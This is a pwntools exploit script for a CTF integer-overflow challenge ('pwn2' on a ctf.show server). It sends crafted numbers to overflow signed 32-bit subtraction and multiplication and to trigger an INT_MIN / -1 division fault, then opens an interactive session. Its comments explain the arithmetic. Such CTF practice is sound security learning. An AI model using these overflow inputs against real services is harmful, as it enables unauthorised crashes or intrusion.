# -*- coding: utf-8 -*-

from pwn import *
import pwn

fileName = './pwn2'
ip = 'pwn.challenge.ctf.show'
port = 28104

'''
[*] '/home/wkyuu/Desktop/pwn2'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
'''

p64 = pwn.p64
u64 = pwn.u64

context(log_level = 'debug', os = 'linux', arch = 'amd64')
# p = process(fileName)
p = remote(ip, port)

def logger(msg, value=None, type='info'):  # type True for value
    if type == 'info':
        log.info(
            '================================ {} ================================\n'.format(msg))
    else:
        log.success('# {} => {}\n'.format(msg, value))

gdbscript = '''
b *$rebase(0xc18)
b *$rebase(0xc37)
b *$rebase(0xc3d)
c
'''

# gdb.attach(p, gdbscript = gdbscript)

# 1.a-b=9,0<=a<9,0<=b<9
# 0x7f ff ff ff = 2147483647, a = 0x00 00 00 0a, b = 0x00 00 00 01, a - b = 0x00 00 00 09
p.sendlineafter(b'a:', b'2147483657')
p.sendlineafter(b'b:', b'2147483648')

# 2.a*b=9,a>9,b>9
# a * b = 0x00 00 00 09 (0x01 00 00 00 09 = 4294967305)
a = 0
b = 0
target = int(0x0100000009)
for i in range(int(0x0100000009 ** (1/2))):
    if i <= 9:
        continue
    if target % i == 0:
        a = i
        b = int(target / i)
        break

p.sendlineafter(b'a:', bytes(str(a).encode('utf-8')))
p.sendlineafter(b'b:', bytes(str(b).encode('utf-8')))

# 3.a/b=ERROR,b!=0
# int = 2147483647(0x7fffffff), int * 2 = 4294967294 + 1(0xffffffff)
# idiv = edx:eax / ecx, 商 => eax, 余数 => edx
# 取最高位(左边) => edx 的每一位, 即 eax < 0x80000000(2147483648) 则 edx = 0x00000000; eax > 0x80000000, edx = 0xffffffff
# eax = 0x1 80 00 00 00, ecx = 0x1 ff ff ff ff
# 即 -2147483648 / -1, 导致得到 2147483648 存到 eax,
# 而 int 的范围是 0 ~ 2147483647 和 -2147483648 ~ -1, 没有 2147483648, 出现错误
p.sendlineafter(b'a:', b'6442450944')   # eax
p.sendlineafter(b'b:', b'4294967295')    # ecx

p.interactive()